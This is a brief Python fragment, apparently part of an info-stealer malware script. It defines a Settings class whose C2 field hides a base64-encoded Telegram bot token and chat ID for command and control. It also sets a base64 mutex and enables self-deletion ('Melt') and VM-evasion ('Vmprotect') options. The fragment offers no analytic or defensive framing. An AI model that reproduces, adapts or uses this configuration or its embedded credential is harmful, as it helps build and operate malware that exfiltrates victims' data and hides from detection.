...
class Settings:
    C2 = (1, base64.b64decode('NjUzNzkzNjM0NDpBQUhwUjBCbTlweDQ3dy1JRVA4cDdhUlVtTjdTOEVxV09kWSQtMTAwMjA5MTc3NDIxOQ==').decode())
    Mutex = base64.b64decode('c2oyZElJVFJRb3NvSFRmVg==').decode()
    PingMe = bool('')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('true')
